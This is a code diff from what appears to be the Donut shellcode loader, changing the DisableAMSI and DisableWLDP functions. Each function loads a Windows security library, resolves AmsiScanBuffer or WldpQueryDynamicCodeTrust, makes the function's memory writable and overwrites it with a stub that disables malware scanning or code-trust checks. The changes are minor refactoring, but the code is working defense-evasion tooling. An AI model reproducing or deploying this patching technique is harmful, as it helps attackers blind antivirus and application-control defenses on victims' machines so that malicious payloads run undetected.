@@ -55,14 +55,14 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     BOOL    disabled = FALSE;
     HMODULE amsi;
     DWORD   len, op, t;
-    LPVOID  cs;
+    LPVOID  cs, func_ptr;
     
     // load amsi
     amsi = inst->api.LoadLibraryA(inst->amsi.s);
     
     if(amsi != NULL) {
       // resolve address of function to patch
-      cs = inst->api.GetProcAddress(amsi, inst->amsiScan);
+      cs = inst->api.GetProcAddress(amsi, inst->amsiScanBuf);
       
       if(cs != NULL) {
         // calculate length of stub
@@ -73,8 +73,8 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
         if(inst->api.VirtualProtect(
           cs, len, PAGE_EXECUTE_READWRITE, &op))
         {
-          // over write with code stub
-          Memcpy(cs, &AmsiScanBufferStub, len);
+          // over write with stub
+          Memcpy(cs, ADR(PCHAR, AmsiScanBufferStub), len);
           
           disabled = TRUE;
             
@@ -221,7 +221,7 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     BOOL    disabled = FALSE;
     HMODULE wldp;
     DWORD   len, op, t;
-    LPVOID  cs;
+    LPVOID  cs, func_ptr;
     
     // load WLDP
     wldp = inst->api.LoadLibraryExA(
@@ -242,7 +242,7 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
           cs, len, PAGE_EXECUTE_READWRITE, &op))
         {
           // over write with stub
-          Memcpy(cs, &WldpQueryDynamicCodeTrustStub, len);
+          Memcpy(cs, ADR(PCHAR, WldpQueryDynamicCodeTrustStub), len);
         
           disabled = TRUE;
         
